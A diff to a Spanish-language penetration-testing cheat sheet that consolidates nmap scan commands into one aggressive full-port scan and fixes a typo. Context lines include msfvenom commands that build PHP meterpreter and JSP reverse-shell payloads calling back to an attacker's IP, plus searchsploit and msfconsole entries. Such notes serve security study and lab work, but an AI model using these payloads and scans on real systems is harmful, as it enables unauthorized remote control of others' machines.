@@ -83,13 +83,7 @@ ncat --ssl (servidor) (puerto) [sirve para crear una conexión más segura y con
 
 ncat servidor (puerto) [sirve para crear conexiones de forma mucho más segura]
 
-nmap -p (numpuerto-numpuerto) (ip o página) [para escanear solo entre un rango de puertos de un número a otro]
-
-nmap -p (puerto) (ip) [es una herramienta que escanea redes para encontrar hosts, puertos abiertos y servicios activos]
-
-nmap (página) o (ip) [para ver qué puertos están abiertos en una máquina remota]
-
-nmap -sVC (ip) [es una forma rápida de obtener información detallada sobre los servicios en un host incluidos detalles de versiones y posibles vulnerabilidades]
+sudo nmap -p- -sC -sV -T4 -O -v (ip) -oN (infoDeNmap) [El comando realiza un escaneo completo de todos los puertos TCP de una ip, detectando servicios, versiones, sistema operativo y ejecutando scripts por defecto, guardando el resultado en un archivo de la informacion de todo el escaneo]
 
 ping página o ip [se usa para verificar la conectividad de red entre tu máquina y otra dirección]
 
@@ -171,7 +165,7 @@ searchsploit (nombre del exploit) [busca posibles exploits]
 
 msfvenom -p php/meterpreter_reverse_tcp LHOST=(ip) LPORT=(puerto) -f raw > archivo.php [crea un archivo PHP malicioso que al subirlo se conecta a tu IP y puerto para darte control remoto del sistema]
 
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=(ip) LPORT=(puerto) -f war > archivo.war [cre un archivo WAR malicioso que al subirlo se conecta a tu IP y puerto para conseguir control remoto del sistema]
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=(ip) LPORT=(puerto) -f war > archivo.war [crea un archivo WAR malicioso que al subirlo se conecta a tu IP y puerto para conseguir control remoto del sistema]
 
 msfconsole [inicia metasploit y su consola para pruebas de penetración que permite identificar, explotar y validar vulnerabilidades]
 
